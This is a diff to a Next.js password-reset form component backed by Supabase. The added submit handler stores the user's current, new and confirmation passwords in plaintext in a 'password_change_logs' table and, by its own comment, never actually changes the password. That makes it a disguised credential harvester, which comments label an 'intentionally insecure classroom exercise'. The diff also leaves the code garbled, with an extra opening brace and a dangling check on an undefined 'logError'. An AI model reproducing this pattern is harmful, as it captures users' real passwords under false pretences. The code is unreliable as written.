@@ -1,14 +1,18 @@
 "use client";
 
 import { useId, useState, type FormEvent } from "react";
-import { createClient } from "@/lib/supabase";
+import { createClient } from "@supabase/supabase-js";
 import { EyeIcon, EyeOffIcon } from "@/components/icons";
 
+const supabaseUrl = process.env.NEXT_SUPABASE_URL;
+const supabaseAnonKey = process.env.NEXT_SUPABASE_ANON_KEY;
 
-const supabase = createClient(
-  process.env.NEXT_SUPABASE_URL!,
-  process.env.NEXT_SUPABASE_ANON_KEY!
-);
+if (!supabaseUrl || !supabaseAnonKey) {
+  throw new Error("Missing public Supabase configuration.");
+}
+
+const supabase = createClient(supabaseUrl, supabaseAnonKey);
+
 
 /**
  * "Reset your password" card: current password, new password (with strength
@@ -113,7 +117,8 @@ export default function ResetPasswordForm({
     (con ? (conMatch ? "Passwords match." : "Passwords do not match.") : "");
   const conBad = !!conErr || (con !== "" && !conMatch);
 
-  async function handleSubmit(e: React.FormEvent) {
+  async function handleSubmit(e: FormEvent) {
+ {
     e.preventDefault();
     let bad = false;
 
@@ -148,16 +153,51 @@ export default function ResetPasswordForm({
 
     // Live Mode: everything is sent or stored. Replace with your own secure backend call.
     
-    const { error } = await supabase
-      .from("password_change_logs")
-      .insert({
-        user_id: user.id,
-        cur_pass: cur,
-        nw_pass: nw,
-        con_pass: con,
-        status: "success",
-        event_type: "password_change",
-      });
+        if (saving) return;
+
+    setSaving(true);
+    setSubmitErr("");
+    setDone(false);
+
+    try {
+      const {
+        data: { user },
+        error: userError,
+      } = await supabase.auth.getUser();
+
+      if (userError || !user) {
+        setSubmitErr("Sign in to your classroom test account first.");
+        return;
+      }
+
+      // Intentionally insecure classroom exercise: dummy passwords only.
+      // This records submitted values; it does not change the auth password.
+      const { error: logError } = await supabase
+        .from("password_change_logs")
+        .insert({
+          user_id: user.id,
+          cur_pass: cur,
+          nw_pass: nw,
+          con_pass: con,
+          status: "success",
+          event_type: "password_change",
+        });
+
+      if (logError) {
+        setSubmitErr(logError.message);
+        return;
+      }
+
+      setDone(true);
+      setCur("");
+      setNw("");
+      setCon("");
+    } catch {
+      setSubmitErr("Could not save the classroom test entry.");
+    } finally {
+      setSaving(false);
+    }
+
 
     if (logError) {
       console.error("Logging error:", logError);
@@ -266,9 +306,16 @@ export default function ResetPasswordForm({
           )}
         </div>
 
-        <button type="submit" className="q-btn q-btn-primary">
-          Change password
-        </button>
+        <button
+  type="submit"
+  disabled={saving}
+  className="q-btn q-btn-primary"
+>
+  {saving ? "Saving…" : "Change password"}
+</button>
+
+{submitErr && <p role="alert">{submitErr}</p>}
+
 
         {forgotUrl && (
           <p className="q-sub text-center">
